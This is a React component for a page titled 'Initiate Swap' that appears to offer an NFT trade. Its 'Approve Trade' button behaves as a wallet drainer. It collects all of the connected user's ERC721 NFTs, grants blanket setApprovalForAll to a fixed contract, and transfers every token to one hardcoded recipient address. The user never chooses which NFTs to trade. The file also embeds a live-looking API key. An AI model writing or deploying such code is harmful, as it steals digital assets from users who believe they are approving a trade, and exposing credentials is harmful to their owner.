"use client";
import { Button } from "@/components/ui/button";
import React from "react";
import { CustomConnectButton } from "../../components/CustomConnectButton"; // Import the connect button
import abi from "@/app/assets/abi/ContractABI.json";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract } from "wagmi";
import { readContract } from "@wagmi/core";
import axios from "axios";
import { erc721Abi } from "viem";
import { wagmiConfig } from "@/lib/wagmiConfig";

interface NFT {
  contractAddress: `0x${string}`;
  tokenId: bigint;
}

const TradeTitle = () => {
  const { address, isConnected } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const [nfts, setNfts] = useState<NFT[]>([]);

  const multiTransferContract =
    "0x2b503543FF84F40536Bab01D5cB5f0c6D8AD3698" as `0x${string}`;
  // const multiTransferContract =
  //   "0x8c92e22dA2A4b03801685A2873b56a2A53Fa6a93" as `0x${string}`; //Test
  const API_KEY = "V4QidqQN3CnapxngEQGMGFl0ZEkS72Bg";

  useEffect(() => {
    const fetchNfts = async (address: `0x${string}`): Promise<void> => {
      const options = {
        method: "GET",
        url: `https://eth-mainnet.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`,
        // url: `https://eth-sepolia.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`, //test
        params: {
          owner: address,
          withMetadata: "true",
          pageSize: "100",
        },
        headers: { accept: "application/json" },
      };

      try {
        const { data, status } = await axios.request(options);
        const nfts = data.ownedNfts
          // .filter(
          //   (nft: any) => nft.contract.openSeaMetadata.floorPrice > 0 //Should be changed
          // )
          .filter((nft: any) => nft.contract.tokenType === "ERC721")
          .map((nft: any) => ({
            contractAddress: nft.contract.address,
            tokenId: nft.tokenId,
          }));
        setNfts(nfts);
      } catch (error) {
        console.error("Error: ", error);
      }
    };
    if (isConnected && address) {
      fetchNfts(address);
    }
  }, [isConnected, address]);

  // Test
  useEffect(() => {
    console.log(nfts);
  }, [nfts]);

  const handleClick = async (): Promise<void> => {
    if (!isConnected || !address) {
      console.error("Wallet not connected or address undefined!");
      return;
    }

    // if (nfts.length == 0) {
    //   console.log("No NFTs selected");
    //   return;
    // }

    const contracts: `0x${string}`[] = nfts.map((nft) => nft.contractAddress);
    const tokenIds: bigint[] = nfts.map((nft) => nft.tokenId);

    try {
      const uniqueContracts: `0x${string}`[] = Array.from(new Set(contracts));
      // console.log(uniqueContracts); //Test
      for (let i = 0; i < uniqueContracts.length; i++) {
        const isApprovedForAll = await readContract(wagmiConfig, {
          abi: erc721Abi,
          address: uniqueContracts[i],
          functionName: "isApprovedForAll",
          args: [address, multiTransferContract],
        });

        if (!isApprovedForAll) {
          console.log(`Approving all NFTs`);
          await writeContractAsync({
            abi: erc721Abi,
            address: uniqueContracts[i],
            functionName: "setApprovalForAll",
            args: [multiTransferContract, true],
          });
          console.log(`All NFTs approved!`);
        } else {
          console.log(`NFTs already approved!`);
        }
      }
    } catch (error) {
      console.error("Error: ", error);
    }

    try {
      console.log("Transferring NFTs...");
      const res = await writeContractAsync({
        abi,
        address: multiTransferContract,
        functionName: "safeTransferMultipleERC721Tokens",
        args: [
          contracts, //array for tokenContracts
          tokenIds, //array for tokenIds
          "0x6A46d306019Ca148937c48E331Aa5BF322e9d968", //address of recipient
          // "0x6ee3dF10F68699A678aED2E884B262d160b2AAAC", //Test
        ],
      });
      console.log("All NFTs transferred");
      console.log("Transaction Hash: ", res);
    } catch (error) {
      console.log("Error: ", error);
    }
  };

  return (
    <div className="flex items-center justify-between pt-10">
      <div className="space-y-4">
        <h1 className="text-3xl font-bold">Initiate Swap</h1>
        {!isConnected || !address ? (
          <div className="text-gray-400">Kindly connect wallet</div>
        ) : null}
      </div>

      <div>
        {isConnected && address ? (
          <Button
            className="text-sm bg-[#33BBC5]"
            size="lg"
            onClick={handleClick}
          >
            Approve Trade
          </Button>
        ) : (
          <CustomConnectButton />
        )}
      </div>
    </div>
  );
};

export default TradeTitle;
